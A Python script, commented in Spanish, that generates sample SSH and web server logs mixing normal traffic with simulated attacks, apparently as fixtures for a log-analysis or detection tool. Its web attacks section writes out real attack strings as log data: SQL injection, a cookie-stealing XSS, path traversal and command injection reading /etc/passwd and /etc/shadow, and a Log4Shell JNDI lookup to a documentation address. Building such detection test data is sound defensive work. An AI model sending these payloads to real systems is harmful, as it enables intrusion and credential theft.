"""Genera logs de ejemplo: tráfico normal mezclado con ataques simulados.

Las IPs atacantes pertenecen a rangos reservados para documentación (RFC 5737),
así que no corresponden a ningún equipo real.

    python samples/generate.py
"""

import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(7)
HERE = Path(__file__).parent
START = datetime(2026, 11, 10, 2, 0, 0)

BROWSER = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/130.0 Safari/537.36")


def ssh_line(ts, msg):
    return ts, f"{ts:%b %d %H:%M:%S} srv01 sshd[{random.randint(1000, 9999)}]: {msg}"


def web_line(ts, ip, method, path, status, ua=BROWSER, referer="-"):
    size = random.randint(200, 9000)
    return ts, (f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" '
                f'{status} {size} "{referer}" "{ua}"')


def port():
    return random.randint(30000, 60000)


def build_ssh():
    out = []
    # Actividad legítima: admins que entran con clave y algún fallo aislado.
    for i in range(12):
        ts = START + timedelta(minutes=37 * i + random.randint(0, 20))
        user, ip = random.choice([("ana", "192.168.1.20"), ("deploy", "10.0.0.5")])
        out.append(ssh_line(ts, f"Accepted publickey for {user} from {ip} port {port()} ssh2"))
    ts = START + timedelta(hours=3)
    out.append(ssh_line(ts, f"Failed password for ana from 192.168.1.20 port {port()} ssh2"))
    out.append(ssh_line(ts + timedelta(seconds=9),
                        f"Accepted password for ana from 192.168.1.20 port {port()} ssh2"))

    # Ataque 1: fuerza bruta contra root que termina entrando.
    ts = START + timedelta(hours=1, minutes=14)
    for _ in range(40):
        ts += timedelta(seconds=random.randint(1, 4))
        out.append(ssh_line(ts, f"Failed password for root from 203.0.113.45 port {port()} ssh2"))
    out.append(ssh_line(ts + timedelta(seconds=3),
                        f"Accepted password for root from 203.0.113.45 port {port()} ssh2"))

    # Ataque 2: enumeración de usuarios con un diccionario.
    ts = START + timedelta(hours=4, minutes=2)
    for user in ["admin", "test", "oracle", "postgres", "ubuntu", "git", "ftpuser",
                 "jenkins", "minecraft", "pi", "guest", "www"]:
        ts += timedelta(seconds=random.randint(2, 6))
        out.append(ssh_line(ts, f"Invalid user {user} from 198.51.100.23 port {port()}"))
        out.append(ssh_line(ts + timedelta(seconds=1),
                            f"Failed password for invalid user {user} from 198.51.100.23 "
                            f"port {port()} ssh2"))
    return out


def build_web():
    out = []
    pages = ["/", "/productos", "/contacto", "/blog/seguridad", "/static/app.js",
             "/static/style.css", "/api/items?page=2", "/favicon.ico"]
    for i in range(300):
        ts = START + timedelta(seconds=45 * i + random.randint(0, 30))
        ip = f"192.168.1.{random.randint(10, 60)}"
        out.append(web_line(ts, ip, "GET", random.choice(pages), 200))
    out.append(web_line(START + timedelta(minutes=50), "192.168.1.33",
                        "GET", "/pagina-vieja", 404))

    # Ataque 3: fuzzing de directorios con gobuster.
    ts = START + timedelta(hours=1, minutes=40)
    words = ["admin", "backup", "old", "test", "dev", "api/v1", "console", "config",
             "uploads", "private", "tmp", "db", "staging", "panel", "cgi-bin"]
    for n in range(60):
        ts += timedelta(milliseconds=random.randint(200, 700))
        path = f"/{random.choice(words)}{n}"
        out.append(web_line(ts, "203.0.113.99", "GET", path, 404, ua="gobuster/3.6"))
    for path, status in [("/.env", 404), ("/.git/config", 404), ("/backup.sql", 200)]:
        ts += timedelta(seconds=1)
        out.append(web_line(ts, "203.0.113.99", "GET", path, status, ua="gobuster/3.6"))

    # Ataque 4: inyección SQL, XSS y path traversal manuales.
    ts = START + timedelta(hours=2, minutes=25)
    attacks = [
        ("/api/items?id=1%27%20OR%20%271%27=%271", 200),
        ("/api/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users", 500),
        ("/api/items?id=1;%20DROP%20TABLE%20users", 500),
        ("/buscar?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200),
        ("/descargar?archivo=../../../../etc/passwd", 400),
        ("/descargar?archivo=%252e%252e%252f%252e%252e%252fetc%252fpasswd", 400),
        ("/ping?host=127.0.0.1;cat%20/etc/shadow", 403),
    ]
    for path, status in attacks:
        ts += timedelta(seconds=random.randint(5, 30))
        out.append(web_line(ts, "198.51.100.77", "GET", path, status))
    out.append(web_line(ts + timedelta(seconds=40), "198.51.100.77", "GET", "/", 200,
                        ua="${jndi:ldap://198.51.100.77:1389/a}"))

    # Ataque 5: fuerza bruta contra el formulario de login.
    ts = START + timedelta(hours=3, minutes=10)
    for _ in range(35):
        ts += timedelta(seconds=random.randint(1, 3))
        out.append(web_line(ts, "203.0.113.150", "POST", "/login", 401,
                            ua="python-requests/2.32"))
    return out


for name, events in [("auth.log", build_ssh()), ("access.log", build_web())]:
    events.sort(key=lambda pair: pair[0])
    (HERE / name).write_text("\n".join(line for _, line in events) + "\n")
    print(f"{name}: {len(events)} líneas")
